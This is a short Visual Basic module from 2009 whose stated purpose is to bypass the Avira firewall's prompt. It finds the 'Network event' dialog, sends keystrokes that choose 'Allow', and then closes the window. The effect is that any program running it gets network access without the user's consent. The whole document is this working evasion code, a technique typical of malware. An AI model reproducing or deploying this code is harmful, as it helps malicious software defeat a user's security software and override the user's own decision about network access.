Attribute VB_Name = "modBypassAvira"
'---------------------------------------------------------------------------------------
' Module      : mAviraFwb
' DateTime    : 13/10/2009
' Author      : fooley
' Purpose     : Bypass Avira firewall prompt message
' Usage       : At your own risk
' Requirements: None
' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission.
'---------------------------------------------------------------------------------------

Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpwindowname As String) As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Sub mAviraFwb()
lngHandle = FindWindow(vbNullString, "Network event")
If (lngHandle <> 0) Then
    lngStartButton = FindWindowEx(lngHandle, 0, "", "&Allow")
    SetWindowPos lngHandle, 0, 0, 0, 0, 0, 2
    AppActivate ("Network event")
    SendKeys "{left}"
    SendKeys "{enter}"
    WireClose = PostMessage(lngHandle, &H10, 0&, 0&)
End If
End Sub
